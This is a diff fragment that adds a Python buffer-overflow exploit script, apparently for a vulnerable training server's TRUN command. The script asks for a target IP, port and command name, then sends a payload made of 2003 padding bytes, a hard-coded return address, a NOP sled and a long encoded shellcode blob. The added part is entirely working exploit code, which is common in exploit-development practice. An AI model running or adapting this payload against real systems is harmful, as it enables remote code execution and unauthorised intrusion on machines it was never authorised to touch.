@@ -58,3 +58,73 @@ elif(len(ip_address)>0) or (len(port_number)>0):
         s.connect((ip_address, int(port_number)))
         s.send((b"TRUN /.:/" + buffer + b"\r\n"))
         s.close()
+------------------------------------------------------------------------------------------------------------------------
+#!/usr/bin/python3
+
+import sys,socket
+
+ip_address=input("Enter the IP address:\n")
+port_number=input("Enter the Port number:\n")
+command_name=input("Enter the command name:\n")
+
+if (len(ip_address)<=0) or (len(port_number)<=0) or (len(command_name)<=0):
+    if (len(ip_address)>0) and (len(port_number)<=0) and (len(command_name)<=0):
+        print("Port number field is empty")
+        print("Command name field is empty")
+    elif (len(ip_address)>0) and (len(port_number)>0) and (len(command_name)<=0):
+        print("Command name field is empty")
+    elif (len(ip_address)>0) and (len(port_number)<=0) and (len(command_name)>0):
+        print("Port number field is empty")
+    elif (len(ip_address)<=0) and (len(port_number)<=0) and (len(command_name)>0):
+        print("IP address field is empty")
+        print("Port number field is empty")
+    elif (len(ip_address)<=0) and (len(port_number)>0) and (len(command_name)<=0):
+        print("IP address field is empty")
+        print("Command name field is empty")
+    elif (len(ip_address)<=0) and (len(port_number)>0) and (len(command_name)>0):
+        print("IP address field is empty")
+    elif (len(ip_address)<=0) and (len(port_number)<=0) and (len(command_name)<=0):
+        print("IP address field is empty")
+        print("Port number field is empty")
+        print("Command name field is empty")
+elif (len(ip_address)>0) and (len(port_number)>0) and (len(command_name)>0):
+    print("*" * 30)
+    buf =  b""
+    buf += b"\xda\xda\xba\x0b\x08\xbf\x1c\xd9\x74\x24\xf4\x58"
+    buf += b"\x2b\xc9\xb1\x52\x83\xc0\x04\x31\x50\x13\x03\x5b"
+    buf += b"\x1b\x5d\xe9\xa7\xf3\x23\x12\x57\x04\x44\x9a\xb2"
+    buf += b"\x35\x44\xf8\xb7\x66\x74\x8a\x95\x8a\xff\xde\x0d"
+    buf += b"\x18\x8d\xf6\x22\xa9\x38\x21\x0d\x2a\x10\x11\x0c"
+    buf += b"\xa8\x6b\x46\xee\x91\xa3\x9b\xef\xd6\xde\x56\xbd"
+    buf += b"\x8f\x95\xc5\x51\xbb\xe0\xd5\xda\xf7\xe5\x5d\x3f"
+    buf += b"\x4f\x07\x4f\xee\xdb\x5e\x4f\x11\x0f\xeb\xc6\x09"
+    buf += b"\x4c\xd6\x91\xa2\xa6\xac\x23\x62\xf7\x4d\x8f\x4b"
+    buf += b"\x37\xbc\xd1\x8c\xf0\x5f\xa4\xe4\x02\xdd\xbf\x33"
+    buf += b"\x78\x39\x35\xa7\xda\xca\xed\x03\xda\x1f\x6b\xc0"
+    buf += b"\xd0\xd4\xff\x8e\xf4\xeb\x2c\xa5\x01\x67\xd3\x69"
+    buf += b"\x80\x33\xf0\xad\xc8\xe0\x99\xf4\xb4\x47\xa5\xe6"
+    buf += b"\x16\x37\x03\x6d\xba\x2c\x3e\x2c\xd3\x81\x73\xce"
+    buf += b"\x23\x8e\x04\xbd\x11\x11\xbf\x29\x1a\xda\x19\xae"
+    buf += b"\x5d\xf1\xde\x20\xa0\xfa\x1e\x69\x67\xae\x4e\x01"
+    buf += b"\x4e\xcf\x04\xd1\x6f\x1a\x8a\x81\xdf\xf5\x6b\x71"
+    buf += b"\xa0\xa5\x03\x9b\x2f\x99\x34\xa4\xe5\xb2\xdf\x5f"
+    buf += b"\x6e\x7d\xb7\x3b\xbd\x15\xca\xc3\x5e\x76\x43\x25"
+    buf += b"\x0a\x66\x02\xfe\xa3\x1f\x0f\x74\x55\xdf\x85\xf1"
+    buf += b"\x55\x6b\x2a\x06\x1b\x9c\x47\x14\xcc\x6c\x12\x46"
+    buf += b"\x5b\x72\x88\xee\x07\xe1\x57\xee\x4e\x1a\xc0\xb9"
+    buf += b"\x07\xec\x19\x2f\xba\x57\xb0\x4d\x47\x01\xfb\xd5"
+    buf += b"\x9c\xf2\x02\xd4\x51\x4e\x21\xc6\xaf\x4f\x6d\xb2"
+    buf += b"\x7f\x06\x3b\x6c\xc6\xf0\x8d\xc6\x90\xaf\x47\x8e"
+    buf += b"\x65\x9c\x57\xc8\x69\xc9\x21\x34\xdb\xa4\x77\x4b"
+    buf += b"\xd4\x20\x70\x34\x08\xd1\x7f\xef\x88\xf1\x9d\x25"
+    buf += b"\xe5\x99\x3b\xac\x44\xc4\xbb\x1b\x8a\xf1\x3f\xa9"
+    buf += b"\x73\x06\x5f\xd8\x76\x42\xe7\x31\x0b\xdb\x82\x35"
+    buf += b"\xb8\xdc\x86"
+
+
+
+    buffer=b"A" * 2003 + b"\xAF\x11\x50\x62" + b"\x90" * 16 + buf 
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((ip_address, int(port_number)))
+    s.send(bytes(command_name, 'utf-8') + b" /.:/" +buffer + b"\r\n")
+    s.close
